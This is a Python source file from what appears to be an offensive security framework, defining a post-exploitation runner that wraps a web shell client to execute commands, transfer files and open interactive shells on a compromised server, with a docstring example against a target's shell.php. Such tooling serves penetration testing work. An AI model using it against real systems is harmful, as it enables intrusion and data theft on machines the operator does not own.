"""WebShell-based post-exploitation runner."""

from __future__ import annotations

from typing import TYPE_CHECKING

from ..base import PostRunnerBase
from ..registry import RunnerRegistry

if TYPE_CHECKING:
    from ofx.api.exploitation.webshell.client import WebShellClient

__all__ = ["PostWebShell"]


@RunnerRegistry.register("webshell")
class PostWebShell(PostRunnerBase):
    """Post-exploitation runner bound to a WebShellClient.

    Wraps an existing WebShellClient to provide the standard runner interface.

    Args:
        client: Configured WebShellClient instance

    Example:
        >>> from ofx.api.exploitation.webshell import WebShellClient
        >>> client = WebShellClient("http://target/shell.php", password="secret")
        >>> runner = PostWebShell(client)
        >>> runner.run("id")
        'uid=33(www-data) gid=33(www-data) groups=33(www-data)'
    """

    def __init__(self, client: WebShellClient):
        self.client = client

    def run(self, command: str, timeout: int | None = None) -> str:  # noqa: ARG002
        """Execute a command via the webshell.

        Args:
            command: Shell command to execute

        Returns:
            Command output
        """
        return self.client.run_command(command)

    def upload(self, local_path: str, remote_path: str) -> None:
        """Upload a file via the webshell.

        Args:
            local_path: Local file path
            remote_path: Remote destination path
        """
        self.client.upload_file(local_path, remote_path)

    def download(self, remote_path: str, local_path: str) -> None:
        """Download a file via the webshell.

        Args:
            remote_path: Remote file path
            local_path: Local destination path
        """
        self.client.download_file(remote_path, local_path)

    def supports_interactive(self) -> bool:
        """WebShell supports interactive shell mode."""
        return True

    def interactive_shell(self, **kwargs) -> None:
        """Start an interactive shell session via the webshell."""
        self.client.interactive_shell(**kwargs)


# Backward compatibility alias
PostRemote = PostWebShell
